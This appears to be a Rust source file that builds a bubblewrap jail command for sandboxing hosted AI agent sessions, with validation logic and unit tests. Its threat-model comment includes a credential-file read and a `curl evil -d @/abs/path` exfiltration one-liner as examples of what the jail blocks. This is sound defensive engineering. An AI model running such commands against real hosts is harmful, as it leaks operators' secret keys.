//! `isolation` — the **per-tenant OS jail** for a hosted agent session: the
//! boundary that would RESTORE a raw `shell` safely.
//!
//! ## ⚠ NOT YET WIRED (status)
//!
//! This module is a correct, deterministic, unit-tested **argv builder** for the
//! jail, but it has **no production call sites**: nothing in the enrol / attach /
//! forced-command path launches [`JailSpec::launch`] today. Because of that, the
//! hosting layer does **not** offer an "OS isolation" mode — enrolment always uses
//! the hosted (no-shell) posture and `dregg-agent` hard-errors on `--os-isolation`.
//! Presenting a flag that "enables isolation" while the jail ran nowhere was the F1
//! fakeout; it is removed. Wiring this (making `dregg-agent attach` re-exec inside
//! [`JailSpec::launch`], fail-closed to no-shell when it returns `Unsupported`) is
//! the honest path to restoring a hosted `shell` — see the per-tenant-isolation design note.
//! Until then this stays a tested building block, not an enforced mechanism.
//!
//! ## Why this exists
//!
//! A hosted agent session runs on shared infrastructure that ALSO holds the
//! operator's keys (e.g. `~/.stripekey` — the
//! LLM / Stripe credentials the brain + skills use). The
//! in-process env-scrub ([`dregg_agent::tools::real_shell`]) strips secret env vars
//! and re-roots `$HOME`, but it CANNOT confine an absolute-path read
//! (`cat /home/op/.stripekey`) or raw egress (`curl evil -d @/abs/path`). So on a
//! hosted box `shell` is refused (the [`crate`] enrol path forbids it) UNTIL a real
//! OS boundary exists. This module is that boundary.
//!
//! ## The design (concrete)
//!
//! Each hosted session is launched as a **dedicated unprivileged unix user** inside
//! a **namespace jail** (bubblewrap / `unshare`) whose view of the world is:
//!
//! 1. **Filesystem** — the workdir subtree is the only writable mount; a minimal
//!    read-only runtime (`/usr`, `/lib`, `/bin`) is bound for the toolchain; a
//!    private `/tmp` tmpfs. The operator's home and key directory are **never
//!    bound**, so the keys are NOT in the jail's filesystem at all — an
//!    absolute-path read finds nothing. (`--die-with-parent`, `--new-session`.)
//! 2. **Network** — the net namespace is empty by default (deny-default egress);
//!    the existing per-host egress cap model is enforced at the namespace edge by an
//!    outbound proxy the host runs (the only reachable route). A `shell` `curl` to
//!    an un-capped host has no route.
//! 3. **Identity** — a dedicated unprivileged uid/gid per tenant, so one session
//!    cannot read another tenant's files even within the jailed view, and nothing
//!    runs as the operator.
//! 4. **Key injection** — the LLM / Stripe keys the BRAIN needs are injected ONLY
//!    as environment variables into the session process (the jail FS has no key
//!    files). The shell tool continues to env-scrub those vars before every spawn,
//!    so the brain reads them but a tenant `shell` cannot. (Keys to the brain,
//!    never to the shell's FS view.)
//! 5. **Syscall floor** — a seccomp profile + Landlock ruleset pin tool execution
//!    to the workdir subtree (the syscall-level twin of the mount confinement).
//!
//! ## What lands here vs the named seam
//!
//! [`JailSpec::bwrap_argv`] is the real, pure, tested **launch mechanism** — the
//! exact `bwrap` argument vector a deploy runs, with the operator key dir excluded,
//! the workdir the only writable bind, an empty net namespace, the unprivileged
//! uid, a cleared env with only the named brain keys re-injected, and the
//! workdir-rooted `$HOME`. [`JailSpec::launch`] spawns it on Linux.
//!
//! The **seam** (named, not closed here): actually running this needs (a) Linux +
//! the privilege to create user namespaces (or a `setuid` bwrap), (b) a compiled
//! seccomp-BPF / Landlock program fd passed via `--seccomp`, and (c) the outbound
//! egress proxy wired to the per-host cap set. Off-Linux (the dev box)
//! [`JailSpec::launch`] returns [`IsolationError::Unsupported`] rather than pretend
//! to confine — the same fail-closed posture as the rest of the system.

use std::path::{Path, PathBuf};

/// Why launching a jail failed.
#[derive(Debug, thiserror::Error)]
pub enum IsolationError {
    /// The host OS cannot provide the namespace jail (not Linux, or `bwrap` absent).
    /// The deploy seam — off this path the hosted session stays shell-confined.
    #[error("per-tenant OS isolation is unsupported on this host: {0}")]
    Unsupported(String),
    /// The jail spec was malformed (e.g. an empty workdir or tenant).
    #[error("invalid jail spec: {0}")]
    BadSpec(String),
    /// Spawning the jailed process failed.
    #[error("jail launch io: {0}")]
    Io(String),
}

/// The concrete description of a per-tenant session jail — everything the launch
/// mechanism needs to confine ONE hosted session.
#[derive(Clone, Debug)]
pub struct JailSpec {
    /// The dedicated unprivileged uid the session runs as (never the operator's).
    pub uid: u32,
    /// The dedicated unprivileged gid the session runs as.
    pub gid: u32,
    /// The session workdir — the ONLY writable mount inside the jail, and the
    /// jailed `$HOME`. Must be an absolute path.
    pub workdir: PathBuf,
    /// The operator's key/home directories that must NEVER be visible inside the
    /// jail (asserted-excluded: the builder refuses to bind any of these). The
    /// belt-and-suspenders check behind "the keys are not in the FS view".
    pub forbidden_paths: Vec<PathBuf>,
    /// Read-only runtime paths bound into the jail so the toolchain runs (e.g.
    /// `/usr`, `/lib`, `/lib64`, `/bin`). Each is mounted read-only; none may be a
    /// `forbidden_path` (the builder enforces this).
    pub ro_runtime: Vec<PathBuf>,
    /// Brain-only environment variables to inject (name → value): the LLM / Stripe
    /// keys the brain needs. Injected after `--clearenv`; the shell tool env-scrubs
    /// these before every spawn, so the brain reads them but a tenant `shell` does
    /// not. No key FILES are ever placed in the jail.
    pub brain_env: Vec<(String, String)>,
    /// The command (argv) to run inside the jail — typically the `dregg-agent
    /// attach …` forced command.
    pub command: Vec<String>,
}

impl JailSpec {
    /// A jail spec with the sane defaults: an empty net namespace, the standard
    /// read-only runtime roots, and the operator home + the common key files marked
    /// forbidden. Fill `brain_env` + `command` for a concrete launch.
    pub fn new(uid: u32, gid: u32, workdir: impl Into<PathBuf>) -> JailSpec {
        JailSpec {
            uid,
            gid,
            workdir: workdir.into(),
            forbidden_paths: vec![PathBuf::from("/root"), PathBuf::from("/home")],
            ro_runtime: vec![
                PathBuf::from("/usr"),
                PathBuf::from("/lib"),
                PathBuf::from("/lib64"),
                PathBuf::from("/bin"),
                PathBuf::from("/sbin"),
                PathBuf::from("/etc/alternatives"),
            ],
            brain_env: Vec::new(),
            command: Vec::new(),
        }
    }

    /// Mark `path` as forbidden inside the jail (never bound) — e.g. the operator's
    /// key directory.
    pub fn forbid(mut self, path: impl Into<PathBuf>) -> JailSpec {
        self.forbidden_paths.push(path.into());
        self
    }

    /// Inject a brain-only environment variable (an LLM / Stripe key).
    pub fn with_brain_env(mut self, name: impl Into<String>, value: impl Into<String>) -> JailSpec {
        self.brain_env.push((name.into(), value.into()));
        self
    }

    /// Set the command to run inside the jail.
    pub fn with_command(mut self, command: Vec<String>) -> JailSpec {
        self.command = command;
        self
    }

    /// Validate the spec — the invariants the confinement rests on.
    fn validate(&self) -> Result<(), IsolationError> {
        if !self.workdir.is_absolute() {
            return Err(IsolationError::BadSpec(format!(
                "workdir must be absolute (got {})",
                self.workdir.display()
            )));
        }
        if self.uid == 0 || self.gid == 0 {
            return Err(IsolationError::BadSpec(
                "the session must run as a NON-root uid/gid".to_string(),
            ));
        }
        if self.command.is_empty() {
            return Err(IsolationError::BadSpec("no command to run".to_string()));
        }
        // The workdir must not sit under a forbidden path, and no read-only runtime
        // bind may be a forbidden path (so the operator keys can never be mounted).
        for f in &self.forbidden_paths {
            if path_within(&self.workdir, f) {
                return Err(IsolationError::BadSpec(format!(
                    "workdir {} is under forbidden path {}",
                    self.workdir.display(),
                    f.display()
                )));
            }
            for ro in &self.ro_runtime {
                if path_within(ro, f) || path_within(f, ro) {
                    return Err(IsolationError::BadSpec(format!(
                        "read-only runtime {} overlaps forbidden path {}",
                        ro.display(),
                        f.display()
                    )));
                }
            }
        }
        Ok(())
    }

    /// The exact **bubblewrap argument vector** that launches this jail. Pure +
    /// deterministic (the tested launch mechanism). The resulting `bwrap …`:
    ///
    /// - drops to the unprivileged `--uid`/`--gid`;
    /// - `--unshare-all` (a fresh user/pid/ipc/uts/cgroup/**net** namespace) and
    ///   `--die-with-parent` / `--new-session` (no terminal-injection, reaped with
    ///   the session) — net is empty ⇒ deny-default egress;
    /// - `--clearenv` then re-injects ONLY `$HOME`/`$TMPDIR`/XDG (rooted in the
    ///   workdir) and the named brain keys — no operator env leaks in;
    /// - binds the read-only runtime roots, a private `/tmp` tmpfs, and the workdir
    ///   as the ONLY writable mount, with `--chdir` into it — the operator home /
    ///   key dir is never bound, so an absolute-path read finds nothing;
    /// - then the session command.
    ///
    /// Returns the spec error if an invariant is violated (so a misbuilt jail never
    /// launches).
    pub fn bwrap_argv(&self) -> Result<Vec<String>, IsolationError> {
        self.validate()?;
        let wd = self.workdir.to_string_lossy().to_string();
        let mut a: Vec<String> = vec![
            "bwrap".into(),
            "--unshare-all".into(),
            "--die-with-parent".into(),
            "--new-session".into(),
            "--uid".into(),
            self.uid.to_string(),
            "--gid".into(),
            self.gid.to_string(),
            "--clearenv".into(),
            // The jailed HOME + temp/XDG all point at the workdir (a `~`-relative
            // read stays in the sandbox; the operator home is not even mounted).
            "--setenv".into(),
            "HOME".into(),
            wd.clone(),
            "--setenv".into(),
            "TMPDIR".into(),
            "/tmp".into(),
            "--setenv".into(),
            "XDG_CONFIG_HOME".into(),
            wd.clone(),
            "--setenv".into(),
            "XDG_DATA_HOME".into(),
            wd.clone(),
            "--setenv".into(),
            "XDG_CACHE_HOME".into(),
            wd.clone(),
        ];
        // Brain-only keys (sorted for determinism). These are env-only; the shell
        // tool scrubs them, so the brain reads them but a tenant `shell` cannot.
        let mut env = self.brain_env.clone();
        env.sort_by(|x, y| x.0.cmp(&y.0));
        for (name, value) in env {
            a.push("--setenv".into());
            a.push(name);
            a.push(value);
        }
        // Read-only runtime roots (only those that exist on the host are bound at
        // launch via --ro-bind-try, so a missing /lib64 is not fatal).
        for ro in &self.ro_runtime {
            a.push("--ro-bind-try".into());
            let p = ro.to_string_lossy().to_string();
            a.push(p.clone());
            a.push(p);
        }
        // A private tmp, then the workdir as the ONLY writable mount, chdir into it.
        a.push("--tmpfs".into());
        a.push("/tmp".into());
        a.push("--bind".into());
        a.push(wd.clone());
        a.push(wd.clone());
        a.push("--chdir".into());
        a.push(wd);
        // The session command.
        a.push("--".into());
        a.extend(self.command.iter().cloned());
        Ok(a)
    }

    /// Launch the jailed session. On Linux this spawns the [`bwrap_argv`] command;
    /// off-Linux it returns [`IsolationError::Unsupported`] (the deploy seam) so a
    /// host that cannot confine never runs the session unconfined.
    ///
    /// [`bwrap_argv`]: JailSpec::bwrap_argv
    #[cfg(target_os = "linux")]
    pub fn launch(&self) -> Result<std::process::Child, IsolationError> {
        let argv = self.bwrap_argv()?;
        let mut cmd = std::process::Command::new(&argv[0]);
        cmd.args(&argv[1..]);
        cmd.spawn().map_err(|e| {
            // A missing `bwrap` binary is the unsupported case, not a generic IO error.
            if e.kind() == std::io::ErrorKind::NotFound {
                IsolationError::Unsupported(
                    "`bwrap` (bubblewrap) not found on PATH — install it to run hosted shells \
                     under per-tenant isolation"
                        .to_string(),
                )
            } else {
                IsolationError::Io(e.to_string())
            }
        })
    }

    /// Off-Linux there is no namespace jail; refuse rather than run unconfined.
    #[cfg(not(target_os = "linux"))]
    pub fn launch(&self) -> Result<std::process::Child, IsolationError> {
        // Still validate so a misbuilt spec is caught in tests on any host.
        self.validate()?;
        Err(IsolationError::Unsupported(
            "per-tenant OS isolation needs Linux namespaces (bubblewrap); this host cannot \
             confine a hosted shell — keep the session shell-disabled"
                .to_string(),
        ))
    }
}

/// `true` iff `path` is `ancestor` or sits underneath it (lexical; both should be
/// absolute). Used to keep the workdir and runtime binds clear of forbidden paths.
fn path_within(path: &Path, ancestor: &Path) -> bool {
    path == ancestor || path.starts_with(ancestor)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> JailSpec {
        JailSpec::new(60001, 60001, "/srv/tenants/alice/workdir")
            .forbid("/opt/operator/keys")
            .with_brain_env("NOUS_PORTAL_KEY", "np_secret")
            .with_brain_env("STRIPE_KEY", "sk_live_secret")
            .with_command(vec![
                "dregg-agent".into(),
                "attach".into(),
                "--account".into(),
                "dga1_alice".into(),
                "--os-isolation".into(),
            ])
    }

    // ── the jail never mounts the operator key dir / home ─────────────────────
    #[test]
    fn the_argv_never_binds_the_operator_keys_or_home() {
        let argv = spec().bwrap_argv().unwrap();
        let joined = argv.join(" ");
        // The operator home + key dir are NOT bound anywhere in the argv.
        assert!(
            !joined.contains("/opt/operator/keys"),
            "key dir never mounted"
        );
        assert!(!joined.contains("/home"), "operator home never mounted");
        assert!(!joined.contains("/root"), "root home never mounted");
        // The ONLY writable bind is the workdir.
        let bind_targets: Vec<&str> = argv
            .windows(3)
            .filter(|w| w[0] == "--bind")
            .map(|w| w[2].as_str())
            .collect();
        assert_eq!(bind_targets, vec!["/srv/tenants/alice/workdir"]);
    }

    // ── deny-default egress + non-root + cleared env ──────────────────────────
    #[test]
    fn the_argv_is_deny_default_egress_nonroot_and_clears_env() {
        let argv = spec().bwrap_argv().unwrap();
        assert!(
            argv.iter().any(|a| a == "--unshare-all"),
            "fresh ns incl. net"
        );
        assert!(
            argv.iter().any(|a| a == "--clearenv"),
            "no operator env leaks"
        );
        assert!(argv.iter().any(|a| a == "--die-with-parent"));
        // Runs as the unprivileged uid/gid.
        let uid_idx = argv.iter().position(|a| a == "--uid").unwrap();
        assert_eq!(argv[uid_idx + 1], "60001");
    }

    // ── the brain keys are injected env-only; HOME is the workdir ──────────────
    #[test]
    fn brain_keys_are_env_only_and_home_is_the_workdir() {
        let argv = spec().bwrap_argv().unwrap();
        // The keys are set via --setenv (env), never written as files / bound.
        let setenv_names: Vec<&str> = argv
            .windows(2)
            .filter(|w| w[0] == "--setenv")
            .map(|w| w[1].as_str())
            .collect();
        assert!(setenv_names.contains(&"NOUS_PORTAL_KEY"));
        assert!(setenv_names.contains(&"STRIPE_KEY"));
        assert!(setenv_names.contains(&"HOME"));
        // HOME points at the workdir, not the operator home.
        let home_idx = argv
            .windows(3)
            .position(|w| w[0] == "--setenv" && w[1] == "HOME")
            .unwrap();
        assert_eq!(argv[home_idx + 2], "/srv/tenants/alice/workdir");
    }

    // ── a misbuilt spec never launches ─────────────────────────────────────────
    #[test]
    fn root_uid_or_relative_workdir_is_refused() {
        // root uid is refused.
        let mut bad = spec();
        bad.uid = 0;
        assert!(matches!(bad.bwrap_argv(), Err(IsolationError::BadSpec(_))));
        // a relative workdir is refused.
        let bad2 = JailSpec::new(60001, 60001, "relative/dir").with_command(vec!["x".into()]);
        assert!(matches!(bad2.bwrap_argv(), Err(IsolationError::BadSpec(_))));
        // a workdir under a forbidden path is refused.
        let bad3 = JailSpec::new(60001, 60001, "/home/op/wd").with_command(vec!["x".into()]);
        assert!(matches!(bad3.bwrap_argv(), Err(IsolationError::BadSpec(_))));
    }

    // ── off-Linux, launch refuses rather than running unconfined ──────────────
    #[cfg(not(target_os = "linux"))]
    #[test]
    fn launch_off_linux_refuses() {
        assert!(matches!(
            spec().launch(),
            Err(IsolationError::Unsupported(_))
        ));
    }
}
